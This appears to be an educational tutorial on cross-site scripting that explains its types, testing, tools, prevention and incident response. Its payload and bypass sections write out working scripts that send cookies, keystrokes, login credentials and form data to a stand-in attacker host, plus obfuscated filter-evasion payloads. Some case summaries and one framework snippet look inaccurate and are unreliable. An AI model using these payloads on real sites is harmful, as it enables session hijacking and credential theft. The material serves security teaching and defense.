# Cross-Site Scripting (XSS): Client-Side Injection Attacks

## Introduction

Cross-Site Scripting (XSS) is a client-side code injection attack where malicious scripts are injected into trusted websites. Unlike other attacks that target the server, XSS attacks target the user's browser, allowing attackers to execute arbitrary JavaScript in the victim's browser context.

## How XSS Works

### Basic Concept
XSS occurs when a web application includes user-supplied data in its output without proper validation or encoding. This allows attackers to inject malicious scripts that execute in the victim's browser.

### Attack Flow
1. **Attacker discovers XSS vulnerability** in a web application
2. **Attacker crafts malicious payload** containing JavaScript code
3. **Victim visits the compromised page** or receives malicious link
4. **Malicious script executes** in victim's browser
5. **Attacker gains access** to victim's session, cookies, or other sensitive data

## Types of XSS

### 1. Reflected XSS (Non-Persistent)

#### Description
Reflected XSS occurs when user input is immediately returned by the web application in an error message, search result, or other response. The malicious script is not stored on the server.

#### Example
```html
<!-- Vulnerable search page -->
<form action="/search" method="GET">
    <input type="text" name="query" placeholder="Search...">
    <input type="submit" value="Search">
</form>

<!-- Server response -->
<p>Search results for: <?php echo $_GET['query']; ?></p>
```

#### Attack Payload
```http
GET /search?query=<script>alert('XSS')</script> HTTP/1.1
```

#### Real-World Impact
- **Session hijacking:** Steal session cookies
- **Keylogging:** Capture keystrokes
- **Phishing:** Display fake login forms
- **Browser exploits:** Execute browser-based attacks

### 2. Stored XSS (Persistent)

#### Description
Stored XSS occurs when malicious input is permanently stored on the target server (database, file system, etc.) and displayed to users when they access the stored content.

#### Example
```html
<!-- Vulnerable comment system -->
<form action="/comment" method="POST">
    <textarea name="comment"></textarea>
    <input type="submit" value="Post Comment">
</form>

<!-- Comments display -->
<div class="comments">
    <?php foreach($comments as $comment): ?>
        <div class="comment"><?php echo $comment['content']; ?></div>
    <?php endforeach; ?>
</div>
```

#### Attack Payload
```html
<script>
    // Steal cookies
    var cookie = document.cookie;
    new Image().src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(cookie);
</script>
```

#### Real-World Impact
- **Worm propagation:** Self-replicating attacks
- **Mass compromise:** Affect all users viewing stored content
- **Long-term persistence:** Attack continues until content is removed

### 3. DOM-Based XSS

#### Description
DOM-based XSS occurs when client-side JavaScript modifies the DOM based on user input without proper sanitization. The server response is benign, but client-side code creates the vulnerability.

#### Example
```javascript
// Vulnerable client-side code
var hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;
```

#### Attack URL
```http
http://victim.com/page#<script>alert('XSS')</script>
```

#### Real-World Impact
- **Client-side data theft:** Access local storage, session storage
- **URL manipulation:** Modify page behavior through URL fragments
- **Harder to detect:** Server-side filtering may not catch this

## XSS Payloads and Techniques

### Basic Alert Payloads
```javascript
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Cookie Stealing
```javascript
<script>
    var cookie = document.cookie;
    new Image().src = 'http://attacker.com/steal?cookie=' + encodeURIComponent(cookie);
</script>
```

### Keylogging
```javascript
<script>
    document.onkeypress = function(e) {
        fetch('http://attacker.com/log?key=' + e.key);
    };
</script>
```

### Session Hijacking
```javascript
<script>
    // Redirect to attacker's domain with session
    window.location = 'http://attacker.com/hijack?session=' + document.cookie;
</script>
```

### Phishing Attacks
```javascript
<script>
    // Create fake login form
    document.body.innerHTML = '<form action="http://attacker.com/steal" method="POST">' +
        '<input name="username" placeholder="Username">' +
        '<input name="password" type="password" placeholder="Password">' +
        '<input type="submit" value="Login">' +
        '</form>';
</script>
```

### Defacement
```javascript
<script>
    document.body.innerHTML = '<h1>Hacked by XSS</h1>';
</script>
```

### Data Exfiltration
```javascript
<script>
    // Exfiltrate form data
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        forms[i].onsubmit = function() {
            var data = new FormData(this);
            fetch('http://attacker.com/exfil', { method: 'POST', body: data });
        };
    }
</script>
```

## Advanced XSS Techniques

### 1. Filter Bypass Techniques

#### Case Manipulation
```javascript
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
```

#### Encoding
```javascript
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
```

#### Event Handlers
```javascript
<img src=x onerror="alert('XSS')">
<div onmouseover="alert('XSS')">Hover me</div>
<body onload="alert('XSS')">
```

#### CSS-Based XSS
```html
<div style="background:url('javascript:alert(\'XSS\')')">
```

### 2. WAF Bypass Techniques

#### Comment Injection
```javascript
<script><!-- alert('XSS') --></script>
```

#### JavaScript Obfuscation
```javascript
<script>
    eval('alert\x28\x27XSS\x27\x29');
</script>
```

#### Unicode Escape Sequences
```javascript
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>
```

#### Base64 Encoding
```javascript
<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycp"></script>
```

### 3. Context-Specific Payloads

#### HTML Context
```html
"><script>alert('XSS')</script>
```

#### Attribute Context
```html
" onmouseover="alert('XSS')
```

#### JavaScript Context
```javascript
'; alert('XSS'); //
```

#### CSS Context
```css
expression(alert('XSS'))
```

## XSS Testing Methodology

### 1. Discovery Phase
```javascript
// Basic test payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### 2. Context Analysis
- **HTML context:** Test for script tag injection
- **Attribute context:** Test for event handler injection
- **JavaScript context:** Test for code injection
- **CSS context:** Test for expression injection

### 3. Filter Testing
```javascript
// Test for blocked characters
<scr<script>ipt>alert('XSS')</script>
<SCRIPT>alert('XSS')</SCRIPT>
```

### 4. Advanced Payload Testing
```javascript
// Test for encoding bypass
&#60;script&#62;alert('XSS')&#60;/script&#62;
```

### 5. DOM-Based Testing
```javascript
// Test URL parameters
http://target.com/page#<script>alert('XSS')</script>
```

## Tools for XSS Testing

### Automated Tools
- **OWASP ZAP:** Automated scanning and manual testing
- **Burp Suite:** Proxy interception and payload injection
- **XSStrike:** Advanced XSS detection and exploitation
- **XSSer:** Automated XSS testing framework

### Manual Testing Tools
- **Browser DevTools:** Inspect and modify DOM
- **Postman:** Test API endpoints for XSS
- **curl:** Command-line testing

### Specialized XSS Tools
- **BeEF (Browser Exploitation Framework):** Hook and control browsers
- **XSS Hunter:** Out-of-band XSS detection
- **DOMPurify:** Client-side sanitization testing

### Usage Examples
```bash
# XSStrike usage
python xsstrike.py -u "http://target.com/search?q=test"

# XSSer usage
xsser --url "http://target.com/vuln" --payload "<script>alert('XSS')</script>"

# Burp Intruder for XSS testing
# 1. Send request to Intruder
# 2. Set payload position
# 3. Load XSS payload list
# 4. Start attack
```

## Prevention Techniques

### 1. Input Validation and Sanitization
```javascript
// Client-side validation (not sufficient alone)
function sanitizeInput(input) {
    return input.replace(/[<>]/g, '');
}
```

### 2. Output Encoding
```php
// PHP HTML encoding
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');

// PHP JavaScript encoding
echo json_encode($user_input);
```

```javascript
// JavaScript encoding
function escapeHtml(text) {
    var map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, function(m) { return map[m]; });
}
```

### 3. Content Security Policy (CSP)
```http
Content-Security-Policy: default-src 'self';
                         script-src 'self' https://trusted.cdn.com;
                         style-src 'self' 'unsafe-inline';
                         img-src 'self' data:;
```

### 4. HTTPOnly Cookies
```php
// Set HttpOnly flag
setcookie('session', $session_id, time() + 3600, '/', '', true, true);
```

### 5. X-Frame-Options
```http
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

### 6. X-Content-Type-Options
```http
X-Content-Type-Options: nosniff
```

### 7. Secure Coding Practices
```javascript
// Use textContent instead of innerHTML
element.textContent = userInput;

// Use safe DOM manipulation
var div = document.createElement('div');
div.textContent = userInput;
parent.appendChild(div);
```

### 8. Framework-Specific Protections

#### React
```jsx
// Automatic XSS prevention
const element = <div>{userInput}</div>;
```

#### Angular
```html
<!-- Automatic sanitization -->
<div [innerHTML]="userInput | safeHtml"></div>
```

#### Vue.js
```html
<!-- Automatic escaping -->
<div>{{ userInput }}</div>
```

## Real-World Examples

### 1. MySpace XSS Worm (2005)
- **Attack:** Stored XSS in user profiles
- **Payload:** Self-replicating JavaScript worm
- **Impact:** 1 million infected profiles in 20 hours
- **Root Cause:** No input sanitization

### 2. Twitter XSS (2009)
- **Attack:** UTF-7 encoding bypass
- **Impact:** Account hijacking
- **Fix:** Input validation improvements

### 3. Facebook XSS (2011)
- **Attack:** Photo upload XSS
- **Impact:** Cookie stealing and account compromise
- **Fix:** Enhanced validation and CSP

### 4. Yahoo XSS (2015)
- **Attack:** Search result XSS
- **Impact:** Session hijacking
- **Fix:** Output encoding improvements

### 5. British Airways XSS (2018)
- **Attack:** Payment page XSS via form fields
- **Impact:** Credit card data theft
- **Fix:** Input validation and CSP implementation

## Detection and Monitoring

### Log Analysis
```bash
# Search for XSS attempts
grep -i "<script>" /var/log/apache2/access.log
grep -i "onerror" /var/log/apache2/access.log
grep -i "javascript:" /var/log/apache2/access.log
```

### WAF Rules
- **ModSecurity XSS rules**
- **Cloudflare XSS protection**
- **AWS WAF XSS detection**

### Application Monitoring
- **Real-time alerting** for XSS patterns
- **User behavior analysis** for anomalous activity
- **Automated payload detection**

## Compliance and Standards

### OWASP Top 10
- **A03:2021 - Injection** (includes XSS)
- **A05:2021 - Security Misconfiguration**

### Industry Standards
- **PCI DSS:** Prevents XSS in payment applications
- **HIPAA:** Protects against XSS in healthcare applications
- **GDPR:** Data protection and breach notification

## Incident Response

### Immediate Actions
1. **Identify affected pages/endpoints**
2. **Implement temporary fixes** (input filtering, rate limiting)
3. **Monitor for active exploitation**
4. **Assess data exposure**

### Recovery Steps
1. **Patch vulnerabilities** (implement proper sanitization)
2. **Clear malicious content** from databases
3. **Reset user sessions** and passwords
4. **Implement CSP** and other headers

### Post-Incident Analysis
1. **Root cause analysis**
2. **Impact assessment**
3. **Security improvements**
4. **User notification** (if data was compromised)

## Conclusion

Cross-Site Scripting remains one of the most prevalent web application vulnerabilities, affecting millions of websites worldwide. Despite being well-understood, XSS continues to be a major source of data breaches and account compromises.

Prevention requires a multi-layered approach including proper input validation, output encoding, Content Security Policy, and secure coding practices. Regular security testing and monitoring are essential to identify and mitigate XSS vulnerabilities before they can be exploited.

Understanding the different types of XSS (reflected, stored, DOM-based) and their various bypass techniques is crucial for both attackers and defenders in the ongoing battle to secure web applications.